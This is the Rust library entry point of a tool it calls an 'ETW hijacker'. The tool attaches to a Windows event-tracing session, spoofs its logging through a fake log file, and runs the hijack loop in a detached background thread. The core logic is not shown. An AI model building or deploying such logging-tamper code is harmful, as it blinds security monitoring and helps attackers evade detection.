//! Library entry points exposing configuration and runtime control for the ETW hijacker.

pub mod etw;
pub mod errors;
pub mod wide;

use crate::etw::EtwController;
use crate::errors::EtwError;

/// Runtime configuration for the ETW hijacker.
///
/// This structure defines the parameters used to initialize the ETW controller.
/// - `session`: Name of the ETW session to attach to.
/// - `fake_log_file`: Path to the fake log file used to spoof ETW logging.
#[derive(Debug, Clone)]
pub struct Config {
    pub session: String,
    pub fake_log_file: String,
}

/// Starts the ETW hijacker in a detached background thread.
///
/// This function spawns a thread that executes the hijacking loop asynchronously,
/// allowing the caller's program to continue without blocking.
/// The background thread runs until the process exits.
///
/// # Arguments
/// * `cfg` - The configuration specifying the ETW session and fake log file.
///
/// # Returns
/// * `Ok(())` if the background thread was successfully started.
/// * `Err(EtwError)` if initialization or thread creation failed.
pub fn run(cfg: Config) -> Result<(), EtwError> {
    // Initialize the ETW controller.
    let controller = EtwController::new(cfg.session.clone(), cfg.fake_log_file.clone())?;

    // Spawn the background thread that runs the hijack loop.
    let handle = std::thread::Builder::new()
        .name("etw-hijacker".into())
        .spawn(move || controller.run_loop())
        .map_err(|e| EtwError::Thread(e.to_string()))?;

    // Detach the thread by forgetting the JoinHandle, letting it run independently.
    std::mem::forget(handle);

    Ok(())
}
